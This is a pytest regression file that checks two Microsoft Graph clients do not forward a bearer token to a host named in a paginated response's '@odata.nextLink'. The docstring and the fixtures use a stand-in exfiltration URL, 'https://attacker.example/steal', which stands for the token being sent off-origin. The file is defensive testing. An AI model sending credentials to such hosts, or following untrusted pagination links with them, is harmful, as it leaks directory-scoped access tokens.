"""A Graph access token must not follow ``@odata.nextLink`` off its origin.

Microsoft Graph paginates by returning an absolute URL in ``@odata.nextLink``.
Both Graph clients took that URL verbatim and re-sent the bearer token to it:

* ``agent_bom.cloud.azure_graph.AzureGraphClient.list``
* ``agent_bom.identity.entra_nhi`` (the NHI discovery client)

Only an iteration count bounded the loop — nothing compared the host against
``GRAPH_BASE_URL``. A tenant-controlled or tampered response body could
therefore name any host and receive a directory-scoped access token:

    https://graph.microsoft.com/v1.0/servicePrincipals  Authorization=Bearer <token>
    https://attacker.example/steal                      Authorization=Bearer <token>

This is a recurrence: #4626 fixed the same shape when a bearer token followed a
paginated URL off-origin. The repository already holds the correct pattern in
two places — ``db/sync.py``'s redirect host allowlist and
``scripts/check_surface_freshness.py``'s ``_require_origin`` — so this is a
third caller of one rule, not a new rule.

The tests assert on **what was sent where**, because the failure mode is a
header arriving at the wrong host; a test that only checked the return value
would pass while leaking.
"""

from __future__ import annotations

import pytest

from agent_bom.cloud.azure_graph import GRAPH_BASE_URL


class _RecordingResponse:
    def __init__(self, payload: dict) -> None:
        self._payload = payload
        self.status_code = 200

    def json(self) -> dict:
        return self._payload


class _RecordingClient:
    """Captures every (url, Authorization) pair the client actually issues."""

    def __init__(self, pages: list[dict]) -> None:
        self._pages = pages
        self.calls: list[tuple[str, str]] = []

    def get(self, url: str, headers: dict | None = None) -> _RecordingResponse:
        self.calls.append((url, (headers or {}).get("Authorization", "")))
        return _RecordingResponse(self._pages.pop(0) if self._pages else {"value": []})


TOKEN = "SUPER-SECRET-GRAPH-TOKEN"
OFF_ORIGIN = "https://attacker.example/steal"


def _client(monkeypatch: pytest.MonkeyPatch, pages: list[dict]):
    from agent_bom.cloud import azure_graph

    client = azure_graph.AzureGraphClient.__new__(azure_graph.AzureGraphClient)
    client._base_url = GRAPH_BASE_URL  # type: ignore[attr-defined]
    recorder = _RecordingClient(pages)
    monkeypatch.setattr(client, "_client", lambda: recorder, raising=False)
    monkeypatch.setattr(client, "_token", lambda: TOKEN, raising=False)
    return client, recorder


def test_the_token_is_never_sent_to_a_host_the_response_body_named(monkeypatch: pytest.MonkeyPatch) -> None:
    """The leak itself."""
    client, recorder = _client(
        monkeypatch,
        [
            {"value": [{"id": "sp-1"}], "@odata.nextLink": OFF_ORIGIN},
            {"value": [{"id": "sp-2"}]},
        ],
    )

    with pytest.raises(Exception):
        client.list("/servicePrincipals")

    leaked = [url for url, auth in recorder.calls if TOKEN in auth and not url.startswith(GRAPH_BASE_URL)]
    assert leaked == [], f"the Graph token was sent off-origin to {leaked}"


def test_an_off_origin_next_link_is_refused_rather_than_silently_dropped(monkeypatch: pytest.MonkeyPatch) -> None:
    """Truncating the page silently would hide a tampered directory response."""
    from agent_bom.cloud.azure_graph import GraphUnavailableError

    client, _recorder = _client(monkeypatch, [{"value": [{"id": "sp-1"}], "@odata.nextLink": OFF_ORIGIN}])
    with pytest.raises(GraphUnavailableError, match="(?i)origin|host"):
        client.list("/servicePrincipals")


def test_ordinary_same_origin_pagination_still_works(monkeypatch: pytest.MonkeyPatch) -> None:
    """The guard must not break Graph's own paging, which is the common case."""
    next_page = f"{GRAPH_BASE_URL}/servicePrincipals?$skiptoken=abc"
    client, recorder = _client(
        monkeypatch,
        [
            {"value": [{"id": "sp-1"}], "@odata.nextLink": next_page},
            {"value": [{"id": "sp-2"}]},
        ],
    )
    items = client.list("/servicePrincipals")
    assert [item["id"] for item in items] == ["sp-1", "sp-2"]
    assert [url for url, _auth in recorder.calls] == [f"{GRAPH_BASE_URL}/servicePrincipals", next_page]


def test_a_scheme_downgrade_on_the_same_host_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    """http:// to the right host would put the token on the wire in cleartext."""
    from agent_bom.cloud.azure_graph import GraphUnavailableError

    downgraded = GRAPH_BASE_URL.replace("https://", "http://") + "/servicePrincipals?$skiptoken=abc"
    client, recorder = _client(monkeypatch, [{"value": [], "@odata.nextLink": downgraded}])
    with pytest.raises(GraphUnavailableError):
        client.list("/servicePrincipals")
    assert not [url for url, auth in recorder.calls if url.startswith("http://") and TOKEN in auth]


def test_the_nhi_discovery_client_pins_its_origin_too(monkeypatch: pytest.MonkeyPatch) -> None:
    """The second client paginates the same way against the same directory."""
    from agent_bom.identity import entra_nhi

    sent: list[tuple[str, str]] = []

    def fake_fetch_json(url: str, headers: dict | None = None, timeout: int = 30) -> dict:
        sent.append((url, (headers or {}).get("Authorization", "")))
        if "attacker" in url:
            return {"value": []}
        return {"value": [{"id": "sp-1"}], "@odata.nextLink": OFF_ORIGIN}

    monkeypatch.setattr("agent_bom.http_client.fetch_json", fake_fetch_json)
    client = entra_nhi.EntraClient.__new__(entra_nhi.EntraClient)
    client._token = TOKEN  # type: ignore[attr-defined]
    client._base_url = GRAPH_BASE_URL  # type: ignore[attr-defined]

    try:
        client._get("/servicePrincipals")
    except Exception:
        pass

    leaked = [url for url, auth in sent if TOKEN in auth and not url.startswith(GRAPH_BASE_URL)]
    assert leaked == [], f"the NHI client sent the Graph token off-origin to {leaked}"
